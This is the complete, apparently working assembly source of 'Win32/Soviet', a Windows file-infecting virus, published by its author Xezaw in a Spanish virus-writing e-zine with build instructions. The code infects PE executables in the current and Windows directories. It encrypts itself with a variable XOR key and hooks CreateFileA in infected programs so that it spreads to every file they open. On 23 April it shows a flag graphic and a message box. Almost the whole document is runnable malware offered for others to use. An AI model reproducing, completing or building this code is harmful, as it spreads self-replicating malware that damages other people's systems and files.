;#####################################################################
;#  Win32/Soviet coded by Xezaw   -=-       DTFZine nº3		     #
;#####################################################################
;# Virus de acción directa Ring3, encriptado con clave variable y    #
;# usa residencia perprocess. En este virus he utilizado piezas del  # 
;# Win32/AstroGirl, que previamente he optimizado. El virus infecta  #
;# archivos en el directorio actual y en el de Windows, se encripta  #
;# con una clave de un byte (típica rutina Xor), que toma del tiempo #
;# del ordenador en milisegundos. Así mismo toquetea la IAT del host #
;# infectado, por cierto tened cuidado con la doc que encontreís por #
;# ahí sobre esta estructura, pues he visto que está mal definida en #
;# muchos sitios :(, como decía.. hookea la API CreateFileA en los   #
;# hosts infectados, de tal forma que si el programa infectado usa   #
;# esta API para mapear algún archivo infectable, el virus lo infecta#
;# y después devuelve el control a la API normalmente, como si no    #
;# hubiera pasado nada. El virus muestra su payload el día de la     #
;# nación Castellana, el día de Villalar ;). El payload consiste en  #
;# una MsgBox y además se muestra un mosaico de pendones  de         #
;# castilla. El nombre ha sido escogido en honor a  mis amigos los   #
;# soviets ;).							     #
;#####################################################################
;# Datos: 							     #
;#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
;# Nombre: Win32/Soviet						     #
;# Fecha de programación: 14/Abril/2000				     #
;# Autor: Xezaw							     #
;# Lenguaje: win32asm						     #			
;# Compilador: Tasm32						     #
;# Características:						     #
;# -Runtime 							     #
;# -Perprocess (CreateFileA)					     #
;# -Encriptado							     #
;# -Clave de encriptado variable.				     #
;# -Infecta añadiendo su código al final de la última sección.       #
;# -Infecta únicamente PE´s. En el directorio local y en el de 	     #
;#  Windows, más los que consiga infectar mediante perprocess	     #		
;# Tamaño:  3304 bytes						     #	
;# Payload: Efecto gráfico con el pendón castellano.		     #
;# Fecha de activación: 23 de Abril.				     #
;#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#								 
;# Para Compilar:						     #					     
;# tasm32 -ml -m5 -q -zn Soviet.asm				     #
;# tlink32 -v -Tpe -c -x -aa Soviet,,, import32		      	     #
;# pewrsec Soviet.exe						     #
;#####################################################################
;# No he metido antiheurística por lo tanto supongo que el virus     #
;# será detectado por varios engines heurísticos. 		     #
;# Bueno, espero que lo disfruteís, no he comentado el código como   #
;# en el AstroGirl porque no he tenido suficiente tiempo, he andado  #
;# bastante liado con otras cosas además del virus :\. Bueno ya de   #
;# paso aprovecho para saludar a gente como: Perikles, Siilex, Buck  #
;# Tokugawa, GriYo, LiteSys (aupa venezuela!!), R2000, Lokutus, zert #
;# halls, is0tope, Bytrack, Viruz, Henky_0, Hangman, providor, Kirk, #
;# ]lobo[, Judash, DarkBlack, s0yuz, Slow, tuxisuau, Natasab, Genl0g,#  
;# Aszy, [sorcerer, Outermind, isaac, sesox, mrjade, esn-min, Anita, #
;# Clayton, raiztlin, ^starki^, Bumblebee(no me engañas por ahí andas#
;# cacho gay xD), khanete, vallez, TheVoid, ProZak, |sick|, Xinaps,  #
;# kadett, VirusBuster, Redrose, Yby, Shadows_t, Leste, rachel,...   #
;# y a mucha otra gente ke me dejo :(			             # 
;#####################################################################
; Puff, paso de escribir un inutil disclaimer porque entre otras 
; cosas no tengo ninguna gana de ello, así que les dejo con el source
; disfrutenlo ;), ah i si encuentran algún bug, que seguramente habrá,
; no duden en comunicarmelo :). 
; Xezaw 2002.


.386
.model flat, stdcall
extrn ExitProcess:proc
extrn MessageBoxA:proc

.data

Soviet db   'Win32/Soviet Coded by Xezaw',0

.code
CodeStart:
mov             eax, offset CryptCodeStart
mov             ebx, offset CryptCodeEnd
mov             ecx, 22h
xor             edx, edx
Call            FirstCryptVx

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;				VIRUS CODE START
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
VXStart		label byte

Call            GetDelta

GetDelta:
pop             ebp
sub             ebp, offset GetDelta

Alcachofas:

lea             eax, [ebp+offset CryptCodeStart]
lea             ebx, [ebp+offset CryptCodeEnd]
ChangeKey:      ;later... 
mov             ecx, 22h
xor             edx, edx
Call            DecryptVx


CryptCodeStart  label byte

GettingApis:
pop		eax
xor		ax, ax

ElMonoEspaik:
cmp		word ptr [eax], 'ZM'
je		Lechuck
Patxaran:
sub		eax, 1000h
jmp		ElMonoEspaik

Lechuck:
mov		ebx, eax
add		ebx, [eax+3Ch]
cmp		word ptr [ebx], 'EP'
jne		Patxaran


Anchoas:
mov		dword ptr [ebp+offset K32], eax
mov             esi, [eax+3Ch]
mov             edx, [esi+eax+78h]
add             edx, eax
mov             esi, [edx+20h]
add             esi, eax
xor             ecx, ecx

GetProc:
mov             edi, [esi]
add             edi, eax
cmp             [edi], dword ptr 'PteG'
jnz             NoFind
cmp             [edi+8h], dword ptr 'erdd'
jnz             NoFind
jmp             CalcGetProc

NoFind:
add             esi, 4h
inc             ecx
jmp             GetProc

CalcGetProc:
mov             ebx, [edx+24h]
add             ebx, eax
xor             esi, esi
mov             si,  word ptr [ebx+ecx*2]
mov             edi, [edx+01Ch]
add             edi, eax
mov             ebx, [edi+esi*4]
add             ebx, eax
mov             [ebp+v_GetProcAddress], ebx

;------------------------------------------------------------
;Apis from Kernel32.dll
;------------------------------------------------------------
push		dword ptr [ebp+offset K32]
lea		esi, [ebp+offset K32Names]
lea		edi, [ebp+offset K32Values]
call		GetApis
;------------------------------------------------------------
;Apis from gdi32.dll
;------------------------------------------------------------
lea		eax, [ebp+offset GDI32]
push		eax
call		dword ptr [ebp+offset v_LoadLibraryA]
push		eax
lea		esi, [ebp+offset GDI32Names]
lea		edi, [ebp+offset GDI32Values]
call		GetApis
;------------------------------------------------------------
;Apis from user32.dll
;------------------------------------------------------------
lea		eax, [ebp+offset User32]
push		eax
call		dword ptr [ebp+offset v_LoadLibraryA]
push		eax
lea		esi, [ebp+offset User32Names]
lea		edi, [ebp+offset User32Values]
call		GetApis
;------------------------------------------------------------

;INFECT FILES IN CURRENT DIRECTORY AND WINDOWS DIRECTORY

FindIT:
lea		eax, [ebp+WIN32_FIND_DATA]
push		eax
lea		eax, [ebp+offset filex]
push		eax
call		dword ptr [ebp+offset v_FindFirstFileA]

inc		eax
jz		GetFolder
dec		eax

mov		[ebp+offset SearchHandle], eax

call		InfectIT 

Alligator:
mov		al, byte ptr [ebp+offset NumberOfFiles]
cmp		ax, 4h
je		GetFolder

NextFile:
lea		eax, [ebp+WIN32_FIND_DATA]
push		eax
push		dword ptr [ebp+offset SearchHandle]
call		dword ptr [ebp+offset v_FindNextFileA]
or		eax, eax
jz		GetFolder
call 		InfectIT
jmp		Alligator

GetFolder: 
mov		al, byte ptr [ebp+offset Directory]
cmp		al, 0h
je 		pErProCeSs
xor		ax, ax
mov		byte ptr [ebp+offset NumberOfFiles],al
mov		byte ptr [ebp+offset Directory], al
lea		eax, [ebp+offset WindowsDir]
push		eax
push		Max_Path
push		eax
call		dword ptr [ebp+offset v_GetWindowsDirectoryA]
Call		dword ptr [ebp+offset v_SetCurrentDirectoryA]
jmp		FindIT

pErProCeSs:
xor		eax, eax
or		ebp, eax
jz		FrstGenHost
call		GetHost
Iepahh = $-offset VXStart

mov		eax, ebx
add		eax, [ebx+3Ch]	;PE signature of our host.
mov		eax, [eax+80h]  ;Import table RVA
add		eax, ebx	
;-----------------------------  ;Now on IAT
SandiasEnlaNiebla:
mov		edi, eax
mov		eax, [eax+0Ch]
or		eax, eax
je		CheckPayload		   ;El programa no importa K32 :((
add		eax, ebx		   ;Ptr to name of DLL
mov		eax, [eax]
or		eax, 20202020h		   ;a minúsculas todo :D
cmp		eax, 'nrek'
je		aupalere
mov		eax, edi
add		eax, 14h		   ;Siguiente tabla del array.
jmp		SandiasEnlaNiebla

aupalere:
push		edi
mov		eax, [edi]
add		eax, ebx		   ;Array de nombres en eax
xor		edx, edx
;-----------------------------------------
FindApistohook:
mov		esi, [eax]
or		esi, esi
je		CheckPayload
add		esi, ebx
inc		esi
inc		esi
lea		edi, [ebp+offset n_CreateFileA]
mov		ecx, 0Bh 
rep		cmpsb
je		hookforlove
inc		edx
piperrak:
add		eax, 4h
jmp		FindApistohook

hookforlove:
;-------------------------------
pop		edi
mov		eax, [edi+10h]
mov		ecx, edx
jecxz		ratagiro
atundelnorte:
add		eax, 4h
loop		atundelnorte
ratagiro:
add		eax, ebx
lea 		esi, [ebp+offset CapitanGarfio]
mov		[eax], esi
mov		[esi+Capitaaancavernicola], ebp

CheckPayload:
lea		eax, [ebp+offset SYSTEMTIME]
push		eax
call		dword ptr [ebp+offset v_GetSystemTime]
cmp		word ptr [ebp+offset ST_wMonth], 4h
jne		ReturnToHost
cmp		word ptr [ebp+offset ST_wDay], 17h
jne		ReturnToHost

;-----------------------
xor		eax, eax
push		eax
push		eax
push		eax
lea		eax, [ebp+offset display]
push		eax
call		dword ptr [ebp+offset v_CreateDCA]
inc		eax
jz		ReturnToHost
dec		eax
mov		[ebp+offset ScreenHandle], eax
Resolucion:
push		8h
push		dword ptr [ebp+offset ScreenHandle]
call		dword ptr [ebp+offset v_GetDeviceCaps]
mov		dword ptr [ebp+Horizontal], eax
push		0Ah
push		dword ptr [ebp+offset ScreenHandle]
call		dword ptr [ebp+offset v_GetDeviceCaps]
mov		dword ptr [ebp+offset Vertical], eax
;-----------------------
xor 		esi, esi
xor 		edi, edi
mov		ebx, [ebp+offset Horizontal]

Drawingg:
pushad
call		DrawStar
popad
add		esi, 25h
cmp		esi, eax
jae		Xcrim
jmp		Drawingg

Xcrim:
xor		esi, esi
add		edi, 50h
cmp		edi, ebx
jae		SayThat
jmp		Drawingg

SayThat:
push 		 20h	
lea		 ebx, [ebp+offset MsgSoviet]
lea		 eax, [ebp+offset titleSoviet]
push		 eax
push		 ebx
push		 00h
call		 dword ptr [ebp+offset v_MessageBoxA]

ReturnToHost:
jmp		dword ptr [ebp+offset Host]


;#################################################################################
;  				   DATA AREA
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
VXData:
VirusSize =	         offset VXEnd - offset VXStart
K32			 dd 00h
v_GetProcAddress         dd 00h
filex			 db '*.exe',0
Max_Path                 equ 260
SearchHandle		 dd 00h
HandleOfFile		 dd 00h
MapHandle		 dd 00h
MappedFileStart		 dd 00h
flastsection		 dd 00h
NumberOfFiles		 db 00h
Directory		 db 01h
WindowsDir	         db  Max_Path dup (?)
OldEntryPoint		 dd 00h
NewEntryPoint		 dd 00h
Host			 dd 00h
GDI32			 db 'GDI32.DLL',0
User32			 db 'USER32.DLL',0
display 		 db 'DISPLAY',0
ScreenHandle		 dd 00h
Horizontal		 dd 00h
Vertical		 dd 00h
MsgSoviet		 db '=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=',0Dh
			 db ' Su sistema está infectado por Win32/Soviet',0Dh
			 db '     dedicado a mis amigos los Soviets ;)',0Dh
			 db '=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=',0Dh
ezpazioinf		 db '                   Saludos a las JCR ;)',0Dh
			 db '=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=',0Dh
villa			 db '          Y vamonos todos a Villalar ;D !!!',0Dh
 			 db '=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=',0Dh
			 db '                   Aupa Castilla!!!!             ', 0
titleSoviet		 db 'Win32/Soviet -=- Coded by Xezaw',0

;-------------------------------kernel32 apis------------------------------------
K32Names 		 label byte

n_ExitProcess		db 'ExitProcess',0
n_SetFileAttributesA	db 'SetFileAttributesA',0
n_CreateFileMappingA    db 'CreateFileMappingA',0
n_MapViewOfFile		db 'MapViewOfFile',0
n_UnmapViewOfFile	db 'UnmapViewOfFile',0
n_CloseHandle		db 'CloseHandle',0
n_SetFileTime		db 'SetFileTime',0
n_GetWindowsDirectoryA 	db 'GetWindowsDirectoryA',0
n_SetCurrentDirectoryA 	db 'SetCurrentDirectoryA',0
n_GetSystemTime		db 'GetSystemTime',0
n_LoadLibraryA		db 'LoadLibraryA',0
n_FindFirstFileA	db 'FindFirstFileA',0
n_CreateFileA		db 'CreateFileA',0
n_FindNextFileA		db 'FindNextFileA',0
db 00h
;------------------------------------------
K32Values		 label byte
v_ExitProcess		 dd 00h
v_SetFileAttributesA     dd 00h
v_CreateFileMappingA	 dd 00h
v_MapViewOfFile		 dd 00h
v_UnmapViewOfFile	 dd 00h
v_CloseHandle		 dd 00h
v_SetFileTime		 dd 00h
v_GetWindowsDirectoryA	 dd 00h
v_SetCurrentDirectoryA	 dd 00h
v_GetSystemTime		 dd 00h
v_LoadLibraryA		 dd 00h
v_FindFirstFileA 	 dd 00h
v_CreateFileA		 dd 00h
v_FindNextFileA		 dd 00h
;-------------------------------User32 apis------------------------------------
User32Names		 label byte
n_MessageBoxA		 db 'MessageBoxA',0

db 			 00h
;------------------------------------------
User32Values		 label byte

v_MessageBoxA		 dd 00h

;-------------------------------GDI32 apis------------------------------------

GDI32Names		 label byte

n_CreateDCA		 db 'CreateDCA',0
n_SetPixel		 db 'SetPixel',0
n_GetDeviceCaps		 db 'GetDeviceCaps',0

db 00h
;------------------------------------------
GDI32Values		 label byte

v_CreateDCA		 dd 00h
v_SetPixel		 dd 00h
v_GetDeviceCaps		 dd 00h

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;				Other Data
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

FILETIME                        struc
        FT_dwLowDateTime        dd               ?
        FT_dwHighDateTime       dd               ?
FILETIME                        ends

;--------------------------------------------------------------------------------

WIN32_FIND_DATA                 label   byte

	WFD_dwFileAttributes    dd               ?
        WFD_ftCreationTime      FILETIME         ?
        WFD_ftLastAccessTime    FILETIME         ?
        WFD_ftLastWriteTime     FILETIME         ?
        WFD_nFileSizeHigh       dd               ?
        WFD_nFileSizeLow        dd               ?
        WFD_dwReserved0         dd               ?
        WFD_dwReserved1         dd               ?
        WFD_szFileName          db Max_Path dup (?)
        WFD_szAlternateFileName db       13 dup (?)
                                db       03 dup (?)
;--------------------------------------------------------------------------------
SYSTEMTIME                      label 	 byte
        ST_wYear                dw       ?
        ST_wMonth               dw       ?
        ST_wDayOfWeek           dw       ?
        ST_wDay                 dw       ?
        ST_wHour                dw       ?
        ST_wMinute              dw       ?
        ST_wSecond              dw       ?
        ST_wMilliseconds        dw       ?
;#################################################################################
;				Castilla´s flag
;--------------------------------------------------------------------------------
CastillaFlag label byte
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 28h, 02h, 01h, 01h, 28h, 0FFh
db 01h, 27h, 02h, 03h, 01h, 27h, 0FFh
db 01h, 27h, 02h, 03h, 01h, 27h, 0FFh
db 01h, 26h, 02h, 05h, 01h, 26h, 0FFh
db 01h, 26h, 02h, 05h, 01h, 26h, 0FFh
db 01h, 25h, 02h, 07h, 01h, 25h, 0FFh
db 01h, 25h, 02h, 07h, 01h, 25h, 0FFh
db 01h, 24h, 02h, 09h, 01h, 24h, 0FFh
db 01h, 24h, 02h, 09h, 01h, 24h, 0FFh
db 01h, 23h, 02h, 0Bh, 01h, 23h, 0FFh
db 01h, 23h, 02h, 0Bh, 01h, 23h, 0FFh
db 01h, 22h, 02h, 0Dh, 01h, 22h, 0FFh
db 01h, 15h, 02h, 27h, 01h, 15h, 0FFh
db 01h, 17h, 02h, 23h, 01h, 17h, 0FFh
db 01h, 19h, 02h, 1Fh, 01h, 19h, 0FFh
db 01h, 1Bh, 02h, 1Bh, 01h, 1Bh, 0FFh
db 01h, 1Dh, 02h, 17h, 01h, 1Dh, 0FFh
db 01h, 1Fh, 02h, 13h, 01h, 1Fh, 0FFh
db 01h, 1Eh, 02h, 15h, 01h, 1Eh, 0FFh
db 01h, 1Eh, 02h, 15h, 01h, 1Eh, 0FFh
db 01h, 1Dh, 02h, 17h, 01h, 1Dh, 0FFh
db 01h, 1Ch, 02h, 0Ch, 01h, 01h, 02h, 0Ch, 01h, 1Ch, 0FFh
db 01h, 1Ch, 02h, 0Ah, 01h, 05h, 02h, 0Ah, 01h, 1Ch, 0FFh
db 01h, 1Bh, 02h, 09h, 01h, 09h, 02h, 09h, 01h, 1Bh, 0FFh
db 01h, 1Bh, 02h, 07h, 01h, 0Dh, 02h, 07h, 01h, 1Bh, 0FFh
db 01h, 1Ah, 02h, 05h, 01h, 13h, 02h, 05h, 01h, 1Ah, 0FFh
db 01h, 1Ah, 02h, 03h, 01h, 17h, 02h, 03h, 01h, 1Ah, 0FFh
db 01h, 19h, 02h, 01h, 01h, 1Dh, 02h, 01h, 01h, 19h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 01h, 51h, 0FFh
db 0FFh
;morado=1
;rojo=2
;#################################################################################
; 				Hooking Area ;D
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CapitanGarfio:
pushad
pushfd
db 0BDh	;mov ebp tal y cual
Capitaaancavernicola=$-offset CapitanGarfio
dd 00h	;mov ebp tal y cual
;---------------------------------------------------
mov	eax, [esp+28h]
lea	edi, [ebp+offset WIN32_FIND_DATA]
push	edi
push	eax
call	dword ptr [ebp+offset v_FindFirstFileA]
;-------------------------------
lea	eax, [ebp+offset v_CreateFileA]
lea	ecx, [ebp+offset xcuizmi]
mov	[ecx+2], eax
;-------------------------------
Infect:
call	InfectIT
;-------------------------------
popfd
popad
xcuizmi label byte
jmp	dword ptr [offset Infect]
ret
endp
;#################################################################################
; 				PROCCEDURES AREA
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GetApis		proc
;edx		ptr to base of library (in the stack)
;esi		ptr to first name of Apis
;edi		ptr to first Value to store

Looooping:
push		esi
push		dword ptr [esp+8h]
call		dword ptr [ebp+offset v_GetProcAddress]
mov		[edi], eax
NextApi:
inc		esi
cmp		byte ptr [esi], 00h
jne		NextApi
inc		esi
cmp		byte ptr [esi], 00h
je		RETURN
add		edi, 4h
jmp		Looooping

RETURN:
ret
endp
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
InfectIT 	proc
;---------------------------------------------------------------
push		80h
lea		esi, [ebp+ offset WFD_szFileName]
push		esi
call		dword ptr [ebp+ offset v_SetFileAttributesA]
;----------------------------------------------------------------
xor		edi, edi
push		edi

MapIT:
push		edi
push		edi
push		3
push		edi
inc		edi
push		edi
push 	        0C0000000h
lea		esi, [ebp+ offset WFD_szFileName]
push		esi
call		dword ptr [ebp+ offset v_CreateFileA]
inc		eax
jz		Failed
dec		eax
mov		[ebp+offset HandleOfFile], eax
;----------------------------------------------------------------
dec		edi
push		edi
push		dword ptr [ebp+ offset WFD_nFileSizeLow]
push		edi
push		4h
push		edi
push		eax
call		dword ptr [ebp+ offset v_CreateFileMappingA]
or		eax, eax
jz		Failed
mov		[ebp+offset MapHandle], eax
;----------------------------------------------------------------
push		dword ptr [ebp+ offset WFD_nFileSizeLow]
push		edi
push		edi
push 		000F001Fh
push		eax
call		dword ptr [ebp+offset v_MapViewOfFile]
mov		[ebp+offset MappedFileStart], eax
;----------------------------------------------------------------
FirstOrSecond:
pop		edi
xor		esi, esi
or		edi, esi
jne		SecondTime
;----------------------------------------------------------------
CheckUtilFile:
cmp   		word ptr [eax], 'ZM'
jne		NotUtil
cmp     	word ptr [eax + 08h], 04h
jne		NotUtil
mov   		esi, [eax + 3Ch]
add     	esi, eax
cmp     	word ptr [esi], 'EP'
jne		NotUtil
;------------------------------------------------------------------
CheckInfected:
cmp 	 	word ptr [esi+42h], 'VS'
je		NotUtil
xor		ax, ax
mov		al, byte ptr [ebp+offset NumberOfFiles]
inc		ax
mov		byte ptr [ebp+offset NumberOfFiles], al
;------------------------------------------------------------------
NewSize:
mov		edi, [esi+3Ch]
xor		edx, edx
mov		eax, [ebp+WFD_nFileSizeLow]
add		eax, VirusSize
div		edi
inc		eax
mul		edi
mov		[ebp+WFD_nFileSizeLow], eax
;------------------------------------------------------------------
call		CloseFile
xor		edi, edi
inc		edi
push		edi
dec		edi
jmp		MapIT
;------------------------------------------------------------------
SecondTime:
mov		ebx, [eax+3Ch]
add		ebx, eax
mov		si, word ptr [ebx+14h]
add		ebx, 18h
add		esi, ebx

mov		ebx, [ebp+offset MappedFileStart]
mov		ecx, [eax+3ch] 
add		ebx, ecx
xor 		ecx, ecx
mov		cx, word ptr [ebx+6h]
dec  		ecx

push		esi
push		ecx

NeguGorriak:
cmp		dword ptr [esi], 'adi.'
je		Azelgas
add		esi, 28h
loop		NeguGorriak
jmp		Latzen
Azelgas:
or		[esi+24h], 0A0000020h
;-------------------------------------
Latzen:
pop		ecx
pop		esi
zitunas:
add		esi,28h
loop		zitunas

LastSection:
or     		[esi + 24h], 0A0000020h	
push		dword ptr [ebx+28h]
mov		edi, [esi+10h]
add		edi, [esi+0ch]
mov		[ebx+28h], edi
push		edi
mov		edi, [esi+10h]		    
add		edi, [esi+14h]			   
add		edi, [ebp+offset MappedFileStart]
mov		[ebp+offset flastsection], edi
mov		eax, [esi+10h]
add		eax, VirusSize

AlignAgain:
mov		edi, [ebx+3Ch]
xor		edx, edx
div		edi
inc		eax
mul		edi
mov		[esi+10h], eax
mov		[esi+8h], eax
add		eax, [esi+0ch]
mov		[ebx+50h], eax	

Iepa   =	offset CryptCodeStart - offset VXStart
Sandia = 	offset CryptCodeEnd- offset CryptCodeStart


MarkInfected:

mov		eax, [ebp+offset MappedFileStart]
mov		ebx, [eax+3ch]
add		eax, ebx
mov		word ptr [eax+42h], 'VS'


CopyVx:
mov		edi, [ebp+offset flastsection]	
lea 		esi, [ebp+offset VXStart]                  
mov 		ecx, VirusSize  
rep 		movsb

StoreEntryPoints:
mov		edi, [ebp+offset flastsection]
pop		eax
pop		ecx
Old   = 	OldEntryPoint-VXStart
New   = 	NewEntryPoint-VXStart
mov		[edi+Old], ecx
mov		[edi+New], eax

ChangeKeyInfection:
lea		eax, [ebp+offset SYSTEMTIME]
push		eax
call		dword ptr [ebp+offset v_GetSystemTime]
xor		ecx, ecx
mov		cl, byte ptr [ebp+offset ST_wMilliseconds]

crematory  =	ChangeKey-VXStart+1
mov		byte ptr [edi+crematory], cl

Encriptalo:
mov		eax, edi
add		eax, Iepa
mov		ebx, eax
add		ebx, Sandia
xor		edx, edx
call		CryptVx

;------------------------------------------------------------------
NotUtil:
call		CloseFile	
ret
;------------------------------------------------------------------
Failed:
pop		eax
Ret		;Algo falló :(
;------------------------------------------------------------------
CloseFile		proc
push 		dword ptr [ebp+ offset MappedFileStart]
call		dword ptr [ebp+ v_UnmapViewOfFile]
push 		dword ptr [ebp+ offset MapHandle]
call		dword ptr [ebp+ offset v_CloseHandle]
lea		eax, dword ptr [ebp+ offset WFD_ftLastWriteTime]
push		eax
lea 		eax, dword ptr [ebp+ offset WFD_ftLastAccessTime] 
push		eax
lea		eax, dword ptr [ebp +offset WFD_ftCreationTime]   
push		eax
push		dword ptr [ebp+offset HandleOfFile]
call		dword ptr [ebp+offset v_SetFileTime]
push		dword ptr [ebp+offset HandleOfFile]
call		dword ptr [ebp+offset v_CloseHandle]
push		dword ptr [ebp+WFD_dwFileAttributes]
lea		eax, [ebp+ WFD_szFileName]	
push		eax
call		dword ptr [ebp+offset v_SetFileAttributesA]
ret
endp
;--------------------------------------------------
endp
;------------------------------------------------------------------------
DrawStar	proc

xor		ecx, ecx
xor		ebx, ebx
mov		edx, edi

lea		eax, [ebp+offset CastillaFlag]
Agaiin:
mov		byte ptr bl, [eax]
cmp		bl, 0FFh
je		NextLine
inc		eax
mov		byte ptr cl, [eax]

tablacolurines:
cmp		bl, 1h
je		Morado
cmp		bl, 2h
je		Rojo

Morado:
mov		ebx, 0FF00FFh
jmp		BeepXpress

Rojo:
mov		ebx, 0FFh
jmp		BeepXpress


BeepXpress:
pushad
push		ebx
push		esi
push		edi
push		dword ptr [ebp+offset ScreenHandle]
call		dword ptr [ebp+offset v_SetPixel]
popad
inc 		edi
loop		BeepXpress
inc		eax
jmp		Agaiin

NextLine:
inc		eax
mov		byte ptr cl, [eax]
cmp		ecx, 0FFh
je		NomoreDraw
inc		esi
mov		edi, edx
jmp		Agaiin

NomoreDraw:	
ret
endp
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GetHost 	proc
mov		eax, [esp]
sub		eax, Iepahh
sub		eax, dword ptr [ebp+offset NewEntryPoint]
mov		ebx, eax
add		eax, dword ptr [ebp+offset OldEntryPoint]
mov		dword ptr [ebp+offset Host], eax
ret
endp
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CryptVx         proc
;eax=offset start Crypt
;ebx=offset end Crypt
;ecx=Crypt Key
;edx must be 0

CryptBucle:
cmp             eax, ebx
je              EndCrypt
mov             dl, byte ptr [eax]
xor             edx, ecx
mov             [eax],byte ptr dl
inc             eax
jmp CryptBucle
EndCrypt:
ret
endp
CryptCodeEnd    label byte
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
DecryptVx       proc
;eax=offset start DeCrypt
;ebx=offset end   DeCrypt
;ecx=Crypt Key
;edx must be 0

DeCryptBucle:
cmp             eax, ebx
je              EndDeCrypt
mov             dl, byte ptr [eax]
xor             edx, ecx
mov             [eax],byte ptr dl
inc             eax
jmp DeCryptBucle
EndDeCrypt:
ret
endp
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
VXEnd     	label byte
;-------------------------------------------------------------------------------
;			VIRUS ENDS ...	ONLY FOR FIRST GEN
;-------------------------------------------------------------------------------

FirstCryptVx    proc
;eax=offset start Crypt
;ebx=offset end Crypt
;ecx=Crypt Key
;edx must be 0

FirstCryptBucle:
cmp             eax, ebx
je              EndFirstCrypt
mov             dl, byte ptr [eax]
xor             edx, ecx
mov             [eax],byte ptr dl
inc             eax
jmp FirstCryptBucle
EndFirstCrypt:
ret
endp
;-------------------------------------------------------------------------------

FrstGenHost:
push 		 20h	
push		 offset Soviet
push		 offset Soviet
push		 00h
call		 MessageBoxA

xor		eax, eax
push		eax
call		ExitProcess

end CodeStart
end